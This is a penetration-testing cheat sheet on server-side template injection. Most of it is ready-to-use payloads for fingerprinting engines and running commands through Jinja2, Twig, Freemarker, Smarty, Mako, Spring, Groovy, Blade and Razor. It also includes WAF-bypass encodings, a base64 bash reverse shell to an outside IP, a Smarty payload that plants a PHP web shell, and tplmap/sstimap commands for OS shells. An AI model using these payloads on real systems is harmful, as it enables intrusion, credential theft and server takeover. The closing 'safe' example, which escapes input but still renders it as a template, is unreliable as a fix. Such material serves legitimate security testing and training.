# SSTI

### Overview

**SSTI (Server-Side Template Injection)** is a critical vulnerability that occurs when user input is embedded into template engines without proper sanitization. Attackers can inject template directives to execute arbitrary code on the server.

**What are template engines?** Template engines process templates containing static content mixed with dynamic placeholders. Examples:

* **Jinja2** (Python/Flask)
* **Twig** (PHP)
* **Freemarker** (Java)
* **Mako** (Python)
* **Razor** (ASP.NET)

**Why it's dangerous:**

* Direct path to remote code execution
* Often leads to complete server compromise
* Can bypass input validation
* Difficult to detect with automated scanners
* Exploits application logic flaws

**Common vulnerable locations:**

* Email templates
* Reporting systems
* Invoice generators
* PDF generators
* Error messages
* Dynamic content rendering

**Impact:**

* Remote code execution (RCE)
* Complete server takeover
* Data exfiltration
* Access to internal systems
* Credential theft
* Lateral movement

***

### Exploitation Workflow Summary

```
1. Detection & Identification
   ├─ Inject test payloads
   ├─ Observe error messages
   ├─ Identify template engine
   └─ Confirm vulnerability

2. Template Engine Fingerprinting
   ├─ Test syntax variations
   ├─ Analyze error messages
   ├─ Determine engine version
   └─ Map available features

3. Basic Exploitation
   ├─ Mathematical operations
   ├─ Object access attempts
   ├─ Built-in function enumeration
   └─ Environment exploration

4. Advanced Exploitation
   ├─ OS command execution
   ├─ File system access
   ├─ Reverse shell deployment
   └─ Data exfiltration

5. Post-Exploitation
   ├─ Privilege escalation
   ├─ Credential harvesting
   ├─ Persistence establishment
   └─ Lateral movement
```

***

### Detection Techniques

#### Basic Detection Payloads

**Universal detection string:**

```
${{<%[%'"}}%\.
```

**Why it works:**

* Contains syntax from multiple template engines
* Triggers errors in vulnerable applications
* Safe (doesn't execute code)

**Alternative detection payloads:**

```
${7*7}
{{7*7}}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

**Expected responses:**

| Payload      | Vulnerable | Not Vulnerable |
| ------------ | ---------- | -------------- |
| `{{7*7}}`    | `49`       | `{{7*7}}`      |
| `${7*7}`     | `49`       | `${7*7}`       |
| `<%= 7*7 %>` | `49`       | `<%= 7*7 %>`   |

#### Error-Based Detection

**Inject invalid syntax:**

```
${{<%[%'"}}@{%\.#{<%=
```

**Vulnerable response examples:**

```
TemplateSyntaxError at /page
jinja2.exceptions.TemplateSyntaxError: unexpected char '@' at 4

Twig_Error_Syntax: Unknown "%" tag in "index.twig" at line 1

freemarker.core.ParseException: Syntax error in template
```

**Error messages reveal:**

* Template engine type
* Engine version
* File paths
* Configuration details

***

### Template Engine Fingerprinting

#### Decision Tree Method

**Step 1: Test basic syntax**

```
{{7*7}}    → If 49: Jinja2, Twig, or similar
${7*7}     → If 49: Mako, JSP, or similar
<%= 7*7 %> → If 49: ERB, ASP, or similar
```

**Step 2: Test specific features**

**For `{{7*7}}` = 49:**

```
{{7*'7'}}

Result: 7777777 → Jinja2
Result: 49 → Twig
```

**For `${7*7}` = 49:**

```
${7*'7'}

Result: Error → Likely Mako
Result: 49 → Likely Spring/Java
```

#### Engine-Specific Identification

**Jinja2 (Python/Flask):**

```
{{ '7'*7 }}        → Returns: 7777777
{% debug %}        → Returns debug info
{{ config }}       → Returns config object
```

**Twig (PHP):**

```
{{7*'7'}}          → Returns: 49
{{dump(app)}}      → Returns app object
{{_self}}          → Returns template object
```

**Freemarker (Java):**

```
${7*7}             → Returns: 49
${1?lower_abc}     → Returns: "a"
<#assign ex="test"> → Variable assignment
```

**Mako (Python):**

```
${7*7}             → Returns: 49
<%import os%>      → Import statement works
```

**Smarty (PHP):**

```
{7*7}              → Returns: 49
{$smarty.version}  → Returns version
{php}echo 1;{/php} → PHP execution
```

***

### Jinja2 Exploitation (Python/Flask)

#### Basic Information Disclosure

**Configuration access:**

```
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
```

**Debug information:**

```
{% debug %}
```

**Request object:**

```
{{request}}
{{request.environ}}
{{request.args}}
{{request.cookies}}
```

**Application object:**

```
{{self}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

#### Remote Code Execution

**Understanding Python object hierarchy:**

**Concept:**

1. All Python objects inherit from `object`
2. `object` has `__subclasses__()` listing all subclasses
3. Some subclasses have dangerous methods (like `subprocess.Popen`)

**Access object base:**

```
{{ ''.__class__ }}              # <class 'str'>
{{ ''.__class__.__mro__ }}      # Method Resolution Order
{{ ''.__class__.__mro__[1] }}   # <class 'object'>
```

**List all subclasses:**

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Find useful classes:**

```python
# Look for classes like:
# - subprocess.Popen
# - os._wrap_close
# - warnings.catch_warnings
```

**RCE via subprocess:**

```
{{ ''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate() }}
```

**Note:** Index `227` varies by Python version and environment.

#### Modern Jinja2 RCE

**Using config object:**

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Step-by-step breakdown:**

1. `config` - Application config object
2. `.__class__` - Get class
3. `.__init__` - Get init method
4. `.__globals__` - Get global namespace
5. `['os']` - Access os module
6. `.popen('id')` - Execute command
7. `.read()` - Read output

**Alternative method:**

```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
```

#### Bypassing Filters

**Using request attributes:**

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

**Hex encoding underscore:**

```
\x5f\x5f = __
```

**Using filters:**

```
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
```

**Building strings:**

```
{{request|attr(["__","class","__"]|join)}}
{{request|attr("_"*2+"class"+"_"*2)}}
```

#### Reverse Shell

**Base64 encode reverse shell:**

```bash
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=
```

**Execute:**

```
{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo= | base64 -d | bash').read()}}
```

**With IFS bypass:**

```
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}BASE64${IFS}|base64${IFS}-d|bash').read()}}
```

***

### Twig Exploitation (PHP)

#### Basic Detection

**Version disclosure:**

```
{{_self.env.version}}
```

**Object dumping:**

```
{{dump(app)}}
{{dump(_self)}}
```

#### Remote Code Execution

**Using map filter:**

```
{{["id"]|map("passthru")}}
{{["whoami"]|map("system")}}
{{["cat /etc/passwd"]|map("passthru")}}
```

**Alternative:**

```
{{["id"]|map("exec")}}
```

#### Advanced Exploitation

**Complex payload:**

```
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

**How it works:**

1. Define block with command
2. Split by delimiter
3. Map to execute command

***

### Freemarker Exploitation (Java)

#### Basic Detection

**Character conversion:**

```
${1?lower_abc}     → Returns: "a"
${27?lower_abc}    → Returns: "{"
```

#### Remote Code Execution

**Execute utility class:**

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

**Alternative syntax:**

```
[#assign ex='freemarker.template.utility.Execute'?new()]
${ex('id')}
```

**Inline execution:**

```
${"freemarker.template.utility.Execute"?new()("id")}
```

#### Building Commands

**Using character conversion:**

```
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc)}
```

**Translates to:** `freemarker`

***

### Smarty Exploitation (PHP)

#### Basic Detection

**Version check:**

```
{$smarty.version}
```

#### Remote Code Execution

**PHP execution (Smarty < 3):**

```
{php}echo `id`;{/php}
{php}system('id');{/php}
```

**File write:**

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```

**Character building:**

```
{chr(105)|cat:chr(100)}
```

**Result:** Executes `id` command

***

### Mako Exploitation (Python)

#### Remote Code Execution

**Import and execute:**

```
<%import os%>
${os.popen('id').read()}
```

**Building command:**

```
${str().join(chr(i)for(i)in[105,100])}
```

**Complete payload:**

```
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

***

### Django Template Engine

#### Information Disclosure

**Debug information:**

```
{% debug %}
```

**Secret key leak:**

```
{{settings.SECRET_KEY}}
```

**Admin credentials:**

```
{% load log %}
{% get_admin_log 10 as log %}
{% for e in log %}
  {{e.user.get_username}} : {{e.user.password}}
{% endfor %}
```

#### XSS

**Unescaped output:**

```
{{ '<script>alert(1)</script>' }}
{{ '<script>alert(1)</script>' | safe }}
```

***

### ASP.NET Razor Exploitation

#### Remote Code Execution

**Process execution:**

```
@System.Diagnostics.Process.Start("whoami");
@System.Diagnostics.Process.Start("cmd","/c whoami");
```

**Building command:**

```
@{
  string x=null;
  int[]l={119,104,111,97,109,105};
  foreach(int c in l){
    x+=((char)c).ToString();
  }
}
@x
```

***

### Spring (Java) Exploitation

#### Remote Code Execution

**Environment access:**

```
${T(java.lang.System).getenv()}
```

**Command execution:**

```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

**Read output:**

```
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
```

**Character obfuscation:**

```
${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)))}
```

**Result:** Executes `cat`

***

### Groovy Exploitation

#### Remote Code Execution

**String building:**

```
${x=new String();for(i in[105,100]){x+=((char)i)}}
```

**Execute command:**

```
${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text}
```

**WAF bypass (comments):**

```
${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
```

***

### Laravel Blade Exploitation

#### Remote Code Execution

**Building command:**

```
{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}
```

**Execute:**

```
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

***

### Testing Methodology

#### Step 1: Identify Injection Points

**Look for:**

* URL parameters
* POST data
* HTTP headers
* Cookies
* File uploads (filename, content)

#### Step 2: Test for Reflection

**Inject unique string:**

```
UNIQUE_STRING_12345
```

**Check if reflected in response**

#### Step 3: Test Template Syntax

**Universal payload:**

```
${{<%[%'"}}%\.
```

**Mathematical operations:**

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

#### Step 4: Fingerprint Engine

**Use decision tree:**

```
{{7*'7'}}  → 7777777 = Jinja2
{{7*'7'}}  → 49 = Twig
```

#### Step 5: Exploit

**Based on identified engine, use appropriate payload**

***

### Automated Tools

#### Tplmap

```bash
# Basic scan
tplmap -u "http://target.com/page?name=test"

# Specify parameter
tplmap -u "http://target.com/page" -d "name=test"

# OS shell
tplmap -u "http://target.com/page?name=test" --os-shell

# File read
tplmap -u "http://target.com/page?name=test" --file-read /etc/passwd
```

#### SSTImap

```bash
# Basic scan
sstimap -u "http://target.com/page?name=test"

# Interactive shell
sstimap -u "http://target.com/page?name=test" -i

# Specify engine
sstimap -u "http://target.com/page?name=test" -e jinja2
```

***

### WAF Bypass Techniques

#### Encoding

**Hex encoding:**

```
\x5f\x5fimport\x5f\x5f = __import__
```

**Unicode:**

```
\u005f\u005fimport\u005f\u005f
```

#### String Concatenation

**Building strings:**

```
{{request|attr("_"+"_"+"class"+"_"+"_")}}
{{request|attr(["__","class","__"]|join)}}
```

#### Comment Injection

**Java/Groovy:**

```
${x=new/**/String();for(i/**/in[105,100]){x+=((char)i)}}
```

#### Character Building

**From integers:**

```
{{chr(105)+chr(100)}}  # "id"
```

***

### Defense & Prevention

**Secure coding practices:**

```python
# Bad - Dangerous
template = Template(user_input)
output = template.render()

# Good - Safe
from markupsafe import escape
safe_input = escape(user_input)
template = Template(safe_input)
output = template.render()
```

**Sandboxing:**

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
```

**Input validation:**

* Whitelist allowed characters
* Reject template syntax (`{{`, `{%`, `${`, etc.)
* Use parameterized templates
* Never pass user input directly to template engine

**Security headers:**

```
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
```

***

### Quick Reference

#### Detection Payloads

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

#### Universal RCE Attempts

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig
{{["id"]|map("system")}}

# Freemarker
${"freemarker.template.utility.Execute"?new()("id")}

# Mako
<%import os%>${os.popen('id').read()}
```

#### Quick Tests

```
# Test math
{{7*7}}

# Test string multiplication
{{7*'7'}}

# Test config
{{config}}

# Test debug
{% debug %}
```



